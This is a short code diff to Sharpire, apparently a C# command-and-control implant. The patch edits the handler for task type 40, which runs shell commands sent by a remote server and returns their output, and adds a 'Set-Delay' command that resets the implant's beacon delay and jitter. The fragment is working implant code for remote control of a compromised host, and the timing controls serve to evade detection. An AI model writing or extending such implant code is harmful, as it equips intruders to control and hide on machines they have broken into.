@@ -232,10 +232,21 @@ namespace Sharpire
                     case 40:
                         string[] parts = packet.data.Split(' ');
                         string output;
-                        if (1 == parts.Length)
+                        if (parts[0] == "Set-Delay")
+                        {
+                            Console.WriteLine("Current delay" + sessionInfo.GetDefaultDelay());
+                            sessionInfo.SetDefaultDelay(UInt32.Parse(parts[1]));
+                            sessionInfo.SetDefaultJitter(UInt32.Parse(parts[2]));
+                            output = "Delay set to " + parts[1]+ "Jitter set to "+ parts[2];
+                        }
+                        else if (1 == parts.Length)
+                        {
                             output = Agent.InvokeShellCommand(parts.FirstOrDefault(), "");
+                        }
                         else
+                        {
                             output = Agent.InvokeShellCommand(parts.FirstOrDefault(), string.Join(" ",parts.Skip(1).Take(parts.Length - 1).ToArray()));
+                        }
                         byte[] packetBytes = EncodePacket(packet.type, output, packet.taskId);
                         return packetBytes;
                     case 41:
